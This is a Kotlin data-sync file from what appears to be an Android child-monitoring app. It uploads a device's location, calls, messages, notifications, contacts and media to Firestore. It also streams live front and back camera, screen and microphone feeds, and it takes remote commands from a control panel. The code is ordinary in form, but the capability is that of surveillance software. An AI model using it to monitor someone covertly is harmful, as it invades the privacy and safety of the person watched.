package com.kids.monitor.data

import android.content.Context
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import java.util.UUID

/**
 * جميع مسارات Firestore المستخدمة في التطبيق ولوحة التحكم.
 *
 * users/{uid}/devices/{deviceId}
 * users/{uid}/devices/{deviceId}/{locations|calls|messages|notifications|contacts|media|commands|live}
 *
 * مجموعة live تحتوي وثائق ثابتة: front, back, screen, mic, status
 * (تحديث وثيقة واحدة لكل لقطة يوفّر الكتابات ويجعل العرض فورياً).
 */
object FirestoreSync {

    const val COLLECTION_USERS = "users"
    const val COLLECTION_DEVICES = "devices"
    const val COLLECTION_LIVE = "live"

    private var initialized = false

    @Synchronized
    fun init(context: Context) {
        StorageUploader.appContext = context.applicationContext
        if (initialized) return
        initialized = true
        try {
            val settings = FirebaseFirestoreSettings.Builder()
                .setPersistenceEnabled(true)
                .build()
            db().setFirestoreSettings(settings)
        } catch (e: Exception) { /* تم التهيئة مسبقاً */ }
    }

    fun db(): FirebaseFirestore = FirebaseFirestore.getInstance()

    fun uid(): String? = FirebaseAuth.getInstance().currentUser?.uid

    /** معرّف ثابت للجهاز: ANDROID_ID (يبقى بعد إعادة التثبيت) مع تخزين محلي. */
    fun deviceId(context: Context): String {
        val prefs = context.getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
        prefs.getString("device_id", null)?.let { return it }
        val androidId = try {
            android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID,
            )
        } catch (e: Exception) {
            null
        }
        val id = if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c") {
            "dev$androidId"
        } else {
            UUID.randomUUID().toString().replace("-", "")
        }
        prefs.edit().putString("device_id", id).apply()
        return id
    }

    fun deviceRef(uid: String, deviceId: String) =
        db().collection(COLLECTION_USERS).document(uid)
            .collection(COLLECTION_DEVICES).document(deviceId)

    fun subRef(uid: String, deviceId: String, name: String) =
        deviceRef(uid, deviceId).collection(name)

    fun bindDevice(context: Context, info: Map<String, Any>) {
        val uid = uid() ?: return
        deviceRef(uid, deviceId(context)).set(info, SetOptions.merge())
    }

    fun updateStatus(context: Context, status: Map<String, Any>) {
        val uid = uid() ?: return
        deviceRef(uid, deviceId(context)).set(status, SetOptions.merge())
    }

    /** كتابة الموقع: وثيقة الجهاز + سجل المواقع + وثيقة live/status. */
    fun writeLocation(context: Context, location: Map<String, Any>) {
        val uid = uid() ?: return
        val did = deviceId(context)
        val withTs = if (location.containsKey("timestamp")) location else
            location + ("timestamp" to System.currentTimeMillis())
        deviceRef(uid, did).set(mapOf("location" to withTs), SetOptions.merge())
        subRef(uid, did, "locations").add(withTs)
        setLive(context, "location", withTs)
    }

    fun appendItem(context: Context, collection: String, item: Map<String, Any>): String? {
        val uid = uid() ?: return null
        val data = if (item.containsKey("timestamp")) item else
            item + ("timestamp" to System.currentTimeMillis())
        return try {
            val ref = subRef(uid, deviceId(context), collection).document()
            ref.set(data)
            ref.id
        } catch (e: Exception) {
            null
        }
    }

    fun updateItem(context: Context, collection: String, docId: String, data: Map<String, Any>) {
        val uid = uid() ?: return
        try {
            subRef(uid, deviceId(context), collection).document(docId).set(data, SetOptions.merge())
        } catch (e: Exception) { /* تجاهل */ }
    }

    /** مرجع وثيقة بث مباشر (front/back/screen/mic/call/status/rtc). */
    fun liveDoc(context: Context, kind: String): com.google.firebase.firestore.DocumentReference? {
        val uid = uid() ?: return null
        return subRef(uid, deviceId(context), COLLECTION_LIVE).document(kind)
    }

    /** إضافة عنصر لمصفوفة داخل وثيقة البث (نقل ICE candidates في WebRTC). */
    fun appendLiveArray(context: Context, kind: String, field: String, value: Any) {
        val ref = liveDoc(context, kind) ?: return
        try {
            ref.set(
                mapOf(
                    field to com.google.firebase.firestore.FieldValue.arrayUnion(value),
                    "updatedAt" to System.currentTimeMillis(),
                ),
                SetOptions.merge(),
            )
        } catch (e: Exception) { /* تجاهل */ }
    }

    /** تحديث وثيقة بث مباشر (front/back/screen/mic) بدل إنشاء وثائق لا نهائية. */
    fun setLive(context: Context, kind: String, data: Map<String, Any>) {
        val uid = uid() ?: return
        subRef(uid, deviceId(context), COLLECTION_LIVE).document(kind).set(
            data + ("updatedAt" to System.currentTimeMillis()),
            SetOptions.merge(),
        )
    }

    /** تسجيل خطأ تشغيلي ليظهر في لوحة التحكم بدل الفشل الصامت. */
    fun logError(context: Context, source: String, message: String) {
        val uid = uid() ?: return
        try {
            subRef(uid, deviceId(context), "media").add(
                mapOf(
                    "name" to "خطأ: $source",
                    "type" to "error",
                    "error" to message.take(500),
                    "timestamp" to System.currentTimeMillis(),
                ),
            )
        } catch (e: Exception) { /* تجاهل */ }
    }

    /** الاستماع للأوامر المعلّقة من لوحة التحكم. */
    fun listenCommands(
        context: Context,
        onPending: (commandId: String, data: Map<String, Any>) -> Unit,
    ): ListenerRegistration? {
        val uid = uid() ?: return null
        return subRef(uid, deviceId(context), "commands")
            .whereEqualTo("status", "pending")
            .limit(20)
            .addSnapshotListener { snapshot, error ->
                if (error != null || snapshot == null) return@addSnapshotListener
                for (doc in snapshot.documents) {
                    val data = doc.data ?: continue
                    onPending(doc.id, data)
                }
            }
    }

    fun setCommandResult(
        context: Context,
        commandId: String,
        status: String,
        result: Map<String, Any>,
    ) {
        val uid = uid() ?: return
        subRef(uid, deviceId(context), "commands").document(commandId).set(
            mapOf(
                "status" to status,
                "result" to result,
                "resultAt" to System.currentTimeMillis(),
            ),
            SetOptions.merge(),
        )
    }
}
